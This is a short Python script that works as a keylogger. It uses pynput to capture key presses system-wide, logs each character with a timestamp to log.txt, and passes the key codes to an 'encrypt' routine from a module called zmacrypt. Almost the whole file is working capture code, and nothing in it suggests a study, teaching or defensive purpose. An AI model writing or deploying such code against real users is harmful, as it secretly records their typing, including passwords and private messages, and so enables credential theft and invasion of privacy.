from pynput.keyboard import Key, Listener
import logging
from datetime import datetime
from zmacrypt import encrypt

logdir = ""
logging.basicConfig(filename = "log.txt",level = logging.DEBUG, format = f'%(asctime)s : %(message)s')


def keypress(Key):
    if len(str(Key))==3:
        key_code=ord(str(Key)[1:2])
        logging.info(str(Key))
        
        #print(key_code, current_date_time())
        encrypt(key_code, current_date_time())
        
        
def current_date_time():
        dt = datetime.today()
        return int(f'2020{str(dt.day).rjust(2,"0")}{str(dt.month).rjust(2,"0")}{dt.hour}{dt.minute}{dt.second}')

with Listener(on_press = keypress) as listener:
    listener.join()

#print(ord('Key.shift'))
